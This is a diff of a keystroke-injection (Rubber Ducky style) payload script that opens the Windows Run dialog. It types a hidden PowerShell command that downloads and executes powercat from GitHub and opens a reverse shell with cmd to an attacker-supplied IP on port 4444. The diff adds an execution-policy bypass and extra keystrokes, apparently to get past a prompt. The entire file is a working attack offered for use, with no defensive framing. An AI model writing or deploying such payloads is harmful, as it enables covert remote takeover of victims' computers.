@@ -8,6 +8,9 @@ REM VERSION: 1.2
 
 GUI r
 DELAY 500
-STRING PowerShell.exe -WindowStyle Hidden -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c <your machine ip> -p 4444 -e cmd"
+STRING PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c <your machine ip> -p 4444 -e cmd"
 ENTER
-ENTER
+DELAY 500
+TAB
+TAB
+SPACE
